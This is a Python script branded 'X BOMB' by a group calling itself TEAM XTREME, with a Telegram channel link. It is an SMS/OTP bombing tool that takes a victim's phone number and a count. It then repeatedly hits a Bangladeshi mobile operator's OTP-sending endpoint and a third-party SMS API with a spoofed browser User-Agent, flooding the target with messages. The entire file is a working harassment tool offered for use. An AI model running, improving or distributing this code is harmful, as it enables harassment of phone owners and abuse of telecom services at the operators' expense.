import os
import requests
from concurrent.futures import ThreadPoolExecutor as bff
import sys

def logo():
    x = """
  ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
  ╚██╗██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
   ╚███╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝
   ██╔██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
  ██╔╝ ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
  ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
                                                
  TOOL: X BOMB
  OWNER: TEAM XTREME
  VERSION: 2.0
  LIMIT: UNLIMITED
  TELEGRAM: https://t.me/tm_xtreme
    """
    print("\033[1;34m" + x + "\033[0m")  # Use ANSI escape codes for styling

def linex():
    print("-" * 40)

def main():
    while True:
        os.system('clear')
        logo()
        linex()
        print("[A]> XTREME BOMBER")
        print("[B]> JOIN CHANNEL")
        x2 = input("[=]> SELECT : ")

        if x2.lower() == "a":
            x3 = input("[=]> ENTER NUMBER : ")
            x4 = input("[=]> ENTER LIMIT : ")
            linex()

            if x4.isdigit():
                with bff(max_workers=120) as minhutanhu:
                    try:
                        minhutanhu.submit(boom, x3, x4)
                    except Exception as e:
                        print(e)
            else:
                continue
        elif x2.lower() == "b":
            os.system("xdg-open https://t.me/tm_xtreme")
            continue
        else:
            continue

def boom(nmbr, lmt):
    global send
    send = 0  # Reset send counter for each bombing process
    try:
        for _ in range(int(lmt)):
            head1 = {
                'Host': 'da-api.robi.com.bd',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; i68 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/387.0.0.13.114;]' 'python-requests/2.31.0',
                'Accept': 'application/json',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json'
            }
            data1 = {'msisdn': nmbr}
            url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
            url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
            
            req1 = requests.post(url1, headers=head1, json=data1)
            req2 = requests.get(url2)

            if req1.status_code == 200 or req2.status_code == 200:
                send += 1
                print(f"\r[API]> STATUS : [200]>[{send}]")
                linex()
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
            
